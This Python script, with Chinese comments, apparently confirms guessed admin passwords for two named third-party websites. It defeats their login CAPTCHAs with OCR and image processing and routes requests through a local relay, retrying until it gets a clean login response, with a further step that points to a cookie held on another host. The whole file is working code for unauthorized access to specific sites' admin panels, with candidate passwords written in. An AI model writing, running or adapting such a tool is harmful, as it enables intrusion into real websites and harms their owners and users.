#!/usr/bin/env python3
"""verify_hits.py - 严格验证yangsha/gdcq119登录(带cookie访问后台页)
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io, http.cookiejar
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
HOST = 'http://127.0.0.1:13080'

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def fetch(url, timeout=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(40000)
    except Exception:
        return b''

def verify_site(dom, tpl, pw, cap_url, cap_img, login_url, admin_pages):
    print('=== verify %s admin/%s ===' % (dom, pw), flush=True)
    for attempt in range(10):
        # 1. 下载验证码
        if tpl == 'A':
            out = fetch(HOST + '/getcap2.php?d=' + urllib.parse.quote(dom))
            img_url = HOST + '/ys_cap2.jpg'
        else:
            out = fetch(HOST + '/getcap_sz.php?d=' + urllib.parse.quote(dom))
            img_url = HOST + '/sz_cap.jpg'
        if b'SAVED:' not in out:
            continue
        img = fetch(img_url)
        if not img or len(img) < 50:
            continue
        try:
            c1 = ocr.classification(img)
            im = Image.open(io.BytesIO(img)).convert('L')
            im = im.resize((im.width * 6, im.height * 6), Image.LANCZOS)
            im = im.point(lambda p: 255 if p > 120 else 0)
            buf = io.BytesIO(); im.save(buf, 'PNG')
            c2 = ocrb.classification(buf.getvalue())
        except Exception:
            continue
        code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
        # 2. 登录
        if tpl == 'A':
            out = fetch(HOST + '/loginpost2.php?d=' + urllib.parse.quote(dom) + '&p=' + urllib.parse.quote(pw) + '&c=' + code)
        else:
            out = fetch(HOST + '/login_sz.php?d=' + urllib.parse.quote(dom) + '&u=admin&p=' + urllib.parse.quote(pw) + '&c=' + code)
        idx = out.find(b'GIF89a')
        body = out[idx+6:] if idx > 0 else out
        text = body.decode('gb2312', 'ignore') if body else ''
        # 3. 判定
        if '确认码' in text or '不一致' in text or '验证码' in text:
            continue
        print('  login resp len=%d: %s' % (len(body), text[:100].replace(chr(10), ' ')), flush=True)
        if len(body) == 0 or '管理' in text or '欢迎' in text:
            # 尝试访问后台页面(带cookie - 但cookie在81.70的jar里, 需要复现会话)
            print('  [needs cookie check via 81.70]', flush=True)
        return text[:200]
    return 'NO_CLEAN_RESPONSE'

# yangsha: 模板A
verify_site('www.yangsha.com', 'A', '666666', '', '', '', [])
print('')
# gdcq119: 模板B
verify_site('gdcq119.com', 'B', 'gdcq119123', '', '', '', [])
